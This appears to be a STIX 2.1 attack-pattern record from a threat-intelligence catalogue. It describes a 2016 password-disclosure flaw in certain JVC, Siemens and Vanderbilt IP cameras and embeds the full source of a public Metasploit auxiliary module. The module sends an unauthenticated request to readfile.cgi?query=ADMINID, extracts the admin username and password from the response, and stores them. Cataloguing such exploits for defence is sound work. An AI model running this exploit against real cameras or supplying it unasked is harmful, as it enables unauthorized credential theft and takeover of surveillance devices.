{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6bffe9e5-fcc4-44bd-a630-7b10bdaf636c",
    "created": "2024-08-14T16:32:29.964841Z",
    "modified": "2024-08-14T16:32:29.964845Z",
    "name": "JVC/Siemens/Vanderbilt IP-Camera Readfile Password Disclosure",
    "description": " SIEMENS IP-Camera (CVMS2025-IR + CCMS2025), JVC IP-Camera (VN-T216VPRU) and Vanderbilt IP-Camera (CCPW3025-IR + CVMW3025-IR) allow an unauthenticated user to disclose the username & password by requesting the javascript page 'readfile.cgi?query=ADMINID'. Siemens firmwares affected: x.2.2.1798, CxMS2025_V2458_SP1, x.2.2.1798, x.2.2.1235  'References'   => [ ['EDB', '40254'] ['EDB', '40263'] ['EDB', '40264'] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/ipcamera_password_disclosure.rb",
            "external_id": "ipcamera_password_disclosure.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'         => 'JVC/Siemens/Vanderbilt IP-Camera Readfile Password Disclosure',\n      'Description'  => %q{\n        SIEMENS IP-Camera (CVMS2025-IR + CCMS2025), JVC IP-Camera (VN-T216VPRU),\n        and Vanderbilt IP-Camera (CCPW3025-IR + CVMW3025-IR)\n        allow an unauthenticated user to disclose the username & password by\n        requesting the javascript page 'readfile.cgi?query=ADMINID'.\n        Siemens firmwares affected: x.2.2.1798, CxMS2025_V2458_SP1, x.2.2.1798, x.2.2.1235\n      },\n      'References'   =>\n        [\n          ['EDB', '40254'],\n          ['EDB', '40263'],\n          ['EDB', '40264']\n        ],\n      'Author'       =>\n        [\n          'Yakir Wizman', # discovery\n          'h00die',    # module\n        ],\n      'License'      => MSF_LICENSE,\n      'DisclosureDate' => 'Aug 16 2016'\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [false, 'URL of the IP-Camera root', '/'])\n    ])\n  end\n\n  def run_host(rhost)\n    begin\n      url = normalize_uri(datastore['TARGETURI'], 'cgi-bin', 'readfile.cgi')\n      vprint_status(\"Attempting to load data from #{url}?query=ADMINID\")\n      res = send_request_cgi({\n        'uri'      => url,\n        'vars_get' => {'query'=>'ADMINID'}\n      })\n      unless res\n        print_error(\"#{peer} Unable to connect to #{url}\")\n        return\n      end\n\n      unless res.body.include?('Adm_ID=')\n        print_error(\"Invalid response received for #{peer} for #{url}\")\n        return\n      end\n\n      if res.body =~ /var Adm_ID=\"(.+?)\";\\s+var Adm_Pass1=\"(.+?)\";/\n        print_good(\"Found: #{$1}:#{$2}\")\n        store_valid_credential(\n          user:         $1,\n          private:      $2,\n          private_type: :password\n        )\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"#{peer} Unable to connect to site\")\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "Aug 16 2016"
}